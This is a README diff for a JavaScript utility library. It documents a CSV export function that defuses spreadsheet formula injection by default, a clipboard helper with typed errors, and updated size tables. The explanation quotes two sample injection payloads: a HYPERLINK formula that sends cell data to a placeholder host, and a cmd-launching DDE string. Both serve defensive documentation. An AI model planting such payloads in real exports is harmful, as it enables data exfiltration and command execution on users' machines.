@@ -526,6 +526,68 @@ re-rendering**. Pass an existing `tableSelection` as `selection: { selection }` 
 borrows it: `destroy()` unsubscribes and leaves it alive, exactly as it treats an injected
 pipeline.
 
+### Export: CSV and the clipboard (`egl-utils-js/table`, `egl-utils-js/dom`)
+
+**A CSV is not an inert document.** Every mainstream spreadsheet evaluates a cell whose text
+begins `=`, `+`, `-` or `@`, so a field reading `=HYPERLINK("http://x/?"&A1,"click")`
+exfiltrates the row beside it the moment somebody opens the export. The data in an export is
+almost never yours — it is whatever your users typed — so `tableCsv` **neutralizes those
+prefixes by default** ([ADR-0066](docs/adr/0066-a-csv-is-not-an-inert-document.md)).
+
+```js
+import { tableCsv } from 'egl-utils-js/table';
+
+tableCsv(table.view().rows, { columns });
+// 'id,name\r\n7,ada\r\n9,bob\r\n'   — RFC 4180, quoting only where required
+
+tableCsv([{ note: '=1+1' }, { note: -5 }], { columns: [{ key: 'note' }] });
+// "note\r\n'=1+1\r\n-5\r\n"          — the formula is defused, the number untouched
+```
+
+That exception is what makes the default liveable: **a field whose whole text is a number is
+left alone**, because prefixing every negative number would corrupt whole columns to buy
+nothing — and a mitigation that damages ordinary data is one people switch off wholesale.
+`-2+3+cmd|'/C calc'!A0` is not a number, and is defused. Turn it off with
+`neutralizeFormulas: false` when you know your consumer is a parser and not a spreadsheet.
+
+Pure and SSR-safe — no `Blob`, no download, no DOM. A string comes out; a server render builds
+the same file for the same rows. Other things worth knowing:
+
+- **Only the rows you pass.** Deriving, filtering and picking happened already:
+  `tableCsv(rows.filter((row) => selection.isSelected(row)), { columns })` exports the
+  selection.
+- **The column array you already have works**, and `label` is used as the header when it is a
+  string. The export reads *values* (`getValue`) rather than rendered `format` output, which
+  may be a DOM node — pass `column.text` for export-specific formatting.
+- **`newline` is an option** because `text.replace(/\r\n/g, '\n')` would also rewrite the
+  CRLFs *inside* quoted fields, corrupting the data while looking like reformatting.
+- **Excel stays out of core** (NFR-06). This function is the extension point: the same rows go
+  to any workbook writer you choose.
+
+Copying is `/dom`, and every refusal is typed — because a copy button that quietly did nothing
+looks exactly like one that worked:
+
+```js
+import { copyToClipboard } from 'egl-utils-js/dom';
+
+// Tab-separated pastes straight into a spreadsheet's cell range:
+await copyToClipboard(tableCsv(rows, { columns, delimiter: '\t' }));
+```
+
+```js
+try {
+  await copyToClipboard(text);
+} catch (error) {
+  if (error.code !== 'EGL_CLIPBOARD') throw error;
+  // 'insecure' → serve over HTTPS · 'denied' → the user said no
+  // 'unsupported' → no clipboard API here · 'failed' → see error.cause
+  warn(hint(error.reason));
+}
+```
+
+There is deliberately **no `execCommand` fallback**: it is deprecated, silently unreliable, and
+would restore the very ambiguity this is here to remove.
+
 ### IPv4 & CIDR (`egl-utils-js/net`)
 
 Strict by design (ADR-0020): four decimal octets, no leading zeros, none of the legacy
@@ -1349,17 +1411,17 @@ own response:
 
 | Route | Requests | Transferred |
 |---|---:|---:|
-| `/errors` | 2 | 1.07 kB |
+| `/errors` | 2 | 1.18 kB |
 | `/net` | 2 | 1.34 kB |
 | `/text` | 3 | 1.67 kB |
-| `/sanitize` | 3 | 2.91 kB |
+| `/sanitize` | 3 | 3.01 kB |
 | `/logging` | 3 | 3.06 kB |
-| `/storage` | 4 | 4.25 kB |
-| `/table` | 5 | 11.09 kB |
-| `/dom` | 8 | 13.51 kB |
-| root (`index.js`) | 7 | 13.45 kB |
-| `/bootstrap` | 8 | 36.70 kB |
-| **the global artifact** | **1** | **35.73 kB** |
+| `/storage` | 4 | 4.34 kB |
+| `/table` | 5 | 11.82 kB |
+| root (`index.js`) | 7 | 13.57 kB |
+| `/dom` | 8 | 13.96 kB |
+| `/bootstrap` | 8 | 37.54 kB |
+| **the global artifact** | **1** | **36.63 kB** |
 
 Two things worth reading off it. **If you need `/bootstrap`, take the artifact** — the whole
 surface in one request now costs *less* than that one entry costs in seven, because
@@ -1373,7 +1435,7 @@ downloads whole files. Both are real; they just belong to different consumers.
 `egl-utils-js` is **1.x**, and the number is meant literally. MAJOR-protected — these change only
 in a 2.0:
 
-- **Every named export**: 119 across the root and the nine subpath entries (108 distinct names —
+- **Every named export**: 123 across the root and the nine subpath entries (111 distinct names —
   the error classes are reachable from both the root and `/errors`).
 - **Every `EGL_*` error code**, and the `.code`-not-`instanceof` identity contract.
 - **Every `exports`-map path** — a deep import that resolves today keeps resolving.
